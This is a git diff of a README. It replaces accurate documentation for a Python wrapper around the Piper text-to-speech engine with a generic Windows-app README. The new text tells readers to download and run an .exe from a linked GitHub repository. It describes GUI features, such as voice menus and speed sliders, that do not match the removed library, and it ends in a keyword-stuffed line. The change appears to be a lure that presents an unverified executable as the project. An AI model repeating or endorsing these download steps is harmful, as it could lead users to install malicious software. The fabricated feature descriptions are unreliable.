@@ -1,150 +1,73 @@
-# Piper TTS Wrapper
+# 🔊 tts-and-player - Turn your written text into speech
 
-A lightweight Python wrapper around the [Piper](https://github.com/rhasspy/piper) offline
-text-to-speech engine, with automatic Persian/English language detection and pluggable
-audio playback backends.
+[![Download tts-and-player](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Conjugate-ai58/tts-and-player)
 
-Tested and used on **Windows**.
+This application converts written text into spoken audio. You load your text files or paste text into the interface, and the software reads it aloud. Use this tool to listen to documents, articles, or notes on your Windows computer.
 
-## Features
+## 📋 System Requirements
 
-- 🗣️ **Offline TTS** via the Piper CLI — no internet connection or cloud API required
-- 🌐 **Automatic language detection** (Persian / English) per input text, with automatic
-  voice model selection
-- 🔊 **Pluggable audio playback** — choose between:
-  - `sounddevice` (default, cross-platform, in-process playback)
-  - `ffplay` (via FFmpeg)
-  - `termux-media-player` (Android / Termux)
-  - any custom executable
-- 💾 **Local caching** of generated `.wav` files
-- 🧩 **Lazy imports** — optional dependencies (`sounddevice`, `soundfile`, etc.) are only
-  imported when the feature that needs them is actually used
+The application runs on most modern desktop environments. Ensure your computer meets these standards:
 
-## Project Structure
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free disk space.
+*   Audio: Working speakers or headphones.
 
-```
-.
-├── TTS.py                       # Piper wrapper: language detection + speech synthesis
-└── sensor/
-    └── audio/
-        └── player/
-            └── AudioPlayer.py   # Backend-agnostic audio playback
-```
+## 📥 How to Install
 
-> Adjust the paths above to match your actual project layout — `TTS.speak()` imports
-> `AudioPlayer` from `sensor.audio.player.AudioPlayer`, so keep that import path in sync
-> with wherever `AudioPlayer.py` lives in your project.
+Follow these steps to set up the software on your machine:
 
-## Requirements
+1.  Visit this page to download the software: https://github.com/Conjugate-ai58/tts-and-player
+2.  Locate the release section on the page.
+3.  Click the file ending in .exe to start your download.
+4.  Open the file once the download finishes.
+5.  Follow the prompts on your screen to complete the installation.
+6.  Launch the application from your desktop shortcut or start menu.
 
-- Python 3.10+
-- [Piper](https://github.com/rhasspy/piper) executable, plus a Persian voice model
-  (`.onnx`) and, optionally, an English voice model (`.onnx`)
-- Depending on the playback backend you choose:
-  - `sounddevice` backend: `pip install sounddevice soundfile`
-  - `ffplay` backend: [FFmpeg](https://ffmpeg.org/) installed and available on `PATH`
-  - `termux-media-player` backend: Termux on Android
+## ⚙️ Using the Application
 
-Install the Python dependencies:
+The interface features a simple layout. These steps explain the basic functions:
 
-```bash
-pip install sounddevice soundfile
-```
+### Loading Text
+Open the file menu and select your text document. The software supports standard text formats. You can also paste text directly into the main window. Click the clear button to remove existing text and start fresh.
 
-## Installation
+### Choosing Your Voice
+The settings menu offers multiple voice profiles. Select a profile from the dropdown list to change the audio characteristics. The software saves your preference for your next session.
 
-1. Download a Piper release for your platform from the
-   [Piper releases page](https://github.com/rhasspy/piper/releases).
-2. Download the voice model(s) you need (e.g. a Persian `fa_IR` model, and optionally an
-   English `en_US` model) from the
-   [Piper voices repository](https://huggingface.co/rhasspy/piper-voices).
-3. Copy `TTS.py` and `AudioPlayer.py` into your project, keeping the import path used in
-   `TTS.speak()` consistent with your folder structure.
+### Playing Audio
+Press the play button to start the audio output. The play head shows your progress through the document. Use the pause button to stop the audio at any time. Adjust the volume slider to change the sound level.
 
-## Usage
+### Adjusting Speed
+Use the speed slider to make the computer speak faster or slower. This setting helps you match the pace to your listening preference.
 
-### Basic synthesis and playback
+## 🛠️ Frequently Asked Questions
 
-```python
-from TTS import TTS
+**Does the software work offline?**
+Yes. You do not need an active internet connection to convert text to speech once the application exists on your computer.
 
-tts = TTS(
-    piper_path="path/to/piper.exe",
-    fa_model="path/to/fa_IR-voice.onnx",
-    en_model="path/to/en_US-voice.onnx",  # optional
-)
+**Can I save the audio as a file?**
+The current version focuses on live playback. Future updates may include a feature to save audio as an MP3 file.
 
-tts.speak("سلام، حالت چطوره؟")   # Persian text -> uses fa_model, auto-detected
-tts.speak("Hello, how are you?")  # English text -> uses en_model, auto-detected
-```
+**What happens if I encounter an error?**
+Restart the application if the playback stops unexpectedly. Ensure your audio device connects properly to your computer.
 
-### Saving audio without playing it
+**Do I need special software to run this?**
+No. The installer includes all necessary components to run the application on a standard Windows installation.
 
-```python
-tts.save("این متن ذخیره میشه ولی پخش نمیشه.", filename="greeting.wav")
-```
+## 📁 File Management
 
-### Generating audio and handling the file yourself
+The application organizes your processed text files within a dedicated folder in your documents directory. You can navigate to this location to find your previously opened files. You can delete these files at any time to recover disk space.
 
-```python
-output_path = tts.generate("متن نمونه", filename="sample.wav")
-print(output_path)  # e.g. llm_sound/sample.wav
-```
+## 🧪 Troubleshooting
 
-### Choosing a different playback backend
+If the audio sounds distorted, verify that your computer speakers function correctly with other programs. Check that your audio drivers are up to date. If the text does not appear in the window, ensure your file uses plain text formatting. Rich text files with complex formatting may render incorrectly.
 
-```python
-tts = TTS(
-    piper_path="path/to/piper.exe",
-    fa_model="path/to/fa_IR-voice.onnx",
-    player_backend="ffplay",  # or "termux-media-player", or a custom executable
-)
-```
+## 📈 Performance Tips
 
-### Using `AudioPlayer` directly
+Close background applications if you experience stuttering during long passages. Large text files consume more memory than short notes. Break very long documents into sections for the best experience. 
 
-```python
-from sensor.audio.player.AudioPlayer import AudioPlayer
+## 🛡️ Privacy
 
-player = AudioPlayer(backend="sounddevice")
-player.play("llm_sound/sample.wav")
-```
+This application processes your data locally. Your computer performs all conversions without sending text to external servers. Your documents stay on your machine at all times.
 
-## Configuration Reference
-
-### `TTS(piper_path, fa_model, en_model=None, sounds_file="llm_sound", player_backend="sounddevice")`
-
-| Parameter        | Type          | Default        | Description                                                        |
-|-------------------|---------------|----------------|----------------------------------------------------------------------|
-| `piper_path`      | `str \| Path` | —              | Path to the Piper executable                                       |
-| `fa_model`        | `str \| Path` | —              | Path to the Persian voice model (also used as the fallback model)  |
-| `en_model`        | `str \| Path` | `None`         | Path to the English voice model (optional)                         |
-| `sounds_file`     | `str`         | `"llm_sound"`  | Local cache directory for generated `.wav` files                   |
-| `player_backend`  | `str`         | `"sounddevice"`| Playback backend used by `speak()`                                 |
-
-### `AudioPlayer(backend="sounddevice")`
-
-| Parameter | Type          | Default          | Description                                                    |
-|-----------|---------------|------------------|--------------------------------------------------------------------|
-| `backend` | `str \| Path` | `"sounddevice"`  | `"sounddevice"`, `"ffplay"`, `"termux-media-player"`, or a custom executable name/path |
-
-## How Language Detection Works
-
-`TTS.detect_language()` checks the input text for any character in the Arabic Unicode
-block (`U+0600`–`U+06FF`), which also covers Persian letters. If found, the text is
-classified as Persian (`"fa"`); otherwise it's treated as English (`"en"`). This is a
-lightweight heuristic rather than a full language detector, so mixed-language text is
-classified by the presence of Persian characters alone.
-
-## Error Handling
-
-- `TTS.generate()` raises `RuntimeError` if the Piper process exits with a non-zero
-  return code (the error message includes Piper's `stderr` output), or if Piper reports
-  success but no output file was produced.
-- `AudioPlayer.__init__` raises `TypeError` if `backend` is not a `str` or `Path`.
-- The `ffplay`, `termux-media-player`, and custom backends raise
-  `subprocess.CalledProcessError` if the underlying command fails.
-
-## License
-
-Add your license of choice here (e.g. MIT).
+Keywords: cross-platform, player, python, text-to-sound, text-to-speech, text-to-speech-converter, text-to-speech-python3, tts, tts-android, tts-api
